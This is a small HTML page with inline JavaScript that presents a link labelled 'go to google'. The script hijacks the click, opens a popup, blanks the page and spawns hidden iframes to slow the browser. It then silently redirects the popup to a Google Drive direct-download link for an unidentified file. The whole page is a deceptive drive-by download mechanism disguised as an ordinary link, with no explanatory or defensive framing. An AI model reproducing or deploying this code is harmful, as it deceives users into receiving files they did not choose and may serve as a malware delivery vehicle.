<body>
<a id=test href="https://www.google.com/" onclick=foo()><h1>go to google</h1></a>
</body>
<script>
var w;
var t;
var z;
function foo(){
document.getElementById("test").href="#";
w = window.open("fake");
t = setInterval('bar()',1);
}
function bar(){
if(w.location.href !== 'fake'){
document.body.innerHTML = "";
slow();
w.location.href = 'https://www.google.com';
clearInterval(t);
z = setInterval('baz()',1);
}
}
function baz(){
try{
w.location.href !== 'fake';
}
catch (e){
setTimeout("w.location.replace('https://drive.usercontent.google.com/download?id=1y2piqYUHSSrcHOCKaQy5EQbDb1IrX5Sh&export=download&authuser=0&confirm=t&uuid=5bdc824e-e9f2-4d16-b944-03088f37c506&at=AGN2oQ35-KbmCMfyVHqljIMSuEN6%3A1773899415218');", 3000);
clearInterval(z);
}
}
function slow() {
for (i=0; i<10; i++ ) {
iframe = document.createElement("iframe");
iframe.src = 'https://www.google.com/';
iframe.style = 'display:none';
document.body.appendChild(iframe);
}
}
</script>
